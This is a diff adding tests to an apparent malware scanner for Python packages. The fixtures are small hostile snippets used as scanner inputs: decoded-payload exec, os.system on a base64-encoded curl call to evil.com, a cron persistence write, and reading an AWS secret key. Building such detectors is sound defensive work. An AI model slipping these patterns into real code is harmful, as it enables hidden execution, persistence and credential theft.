@@ -287,3 +287,89 @@ def test_analyze_package_detects_install_time_python_execution(tmp_path: Path) -
     corr_005 = next(f for f in analysis.findings if f.rule_id == "CORR-005")
     assert corr_005.runs_at_install is True
     assert corr_005.severity == Severity.HIGH
+
+
+def test_builtins_eval_and_exec() -> None:
+    # builtins.eval / builtins.exec
+    res1 = scan_python("import builtins\nbuiltins.eval(user_payload)")
+    assert any(h.rule_id == "EXEC-001" for h in res1.hits)
+
+    res2 = scan_python("import builtins\nbuiltins.exec('print(1)')")
+    assert any(h.rule_id == "EXEC-002" for h in res2.hits)
+
+    # from builtins import eval as custom_eval
+    res3 = scan_python("from builtins import eval as custom_eval\ncustom_eval(code)")
+    assert any(h.rule_id == "EXEC-001" for h in res3.hits)
+
+
+def test_compile_and_exec_tracking() -> None:
+    # compile() on decoded payload assigned to variable then exec()
+    source_compile_decoded = """
+import base64
+payload = base64.b64decode('cHJpbnQoMSk=')
+code_obj = compile(payload, '<string>', 'exec')
+exec(code_obj)
+"""
+    res = scan_python(source_compile_decoded)
+    rule_ids = [h.rule_id for h in res.hits]
+    assert "EXEC-003" in rule_ids
+    exec_hit = next(h for h in res.hits if h.rule_id == "EXEC-003")
+    assert exec_hit.severity == Severity.CRITICAL
+
+
+def test_decoded_command_in_process_call() -> None:
+    # b64decode payload passed directly to os.system or subprocess.run
+    source = """
+import base64
+import os
+cmd = base64.b64decode('Y3VybCBodHRwczovL2V2aWwuY29t')
+os.system(cmd)
+"""
+    res = scan_python(source)
+    assert any(h.rule_id == "PROC-004" and h.severity == Severity.HIGH for h in res.hits)
+
+
+def test_asyncio_process_call() -> None:
+    source = "import asyncio\nasyncio.create_subprocess_shell('uname -a')"
+    res = scan_python(source)
+    assert any(h.rule_id == "PROC-002" and h.signal == Signal.PROCESS for h in res.hits)
+
+
+def test_additional_decoders() -> None:
+    # base85 decode
+    res_b85 = scan_python("import base64\ndata = base64.b85decode(raw)")
+    assert any(h.rule_id == "OBF-004" and h.signal == Signal.DECODE for h in res_b85.hits)
+
+    # zlib decompress
+    res_zlib = scan_python("import zlib\nraw = zlib.decompress(blob)")
+    assert any(h.rule_id == "OBF-004" and h.signal == Signal.DECODE for h in res_zlib.hits)
+
+    # gzip decompress
+    res_gzip = scan_python("import gzip\nraw = gzip.decompress(blob)")
+    assert any(h.rule_id == "OBF-004" and h.signal == Signal.DECODE for h in res_gzip.hits)
+
+
+def test_variable_tracked_filesystem_write() -> None:
+    # Startup cron path assigned to variable and opened for write
+    source = """
+cron_path = '/etc/cron.d/persistence'
+with open(cron_path, 'w') as f:
+    f.write('* * * * * root evil')
+"""
+    res = scan_python(source)
+    assert any(h.rule_id == "FS-002" and h.severity == Severity.HIGH for h in res.hits)
+
+
+def test_shebang_script_detection(tmp_path: Path) -> None:
+    """Extensionless script with python shebang should be analyzed with python scanner."""
+    files = {
+        "bin/cli": (
+            "#!/usr/bin/env python3\nimport os\ntoken = os.environ['AWS_SECRET_ACCESS_KEY']\n"
+        )
+    }
+    pkg_inv = inventory(tmp_path, "pkg_shebang", files)
+    meta = make_metadata()
+
+    analysis = analyze_package(meta, pkg_inv, None, None)
+    assert analysis.files_scanned == 1
+    assert any(f.rule_id == "ENV-002" for f in analysis.findings)
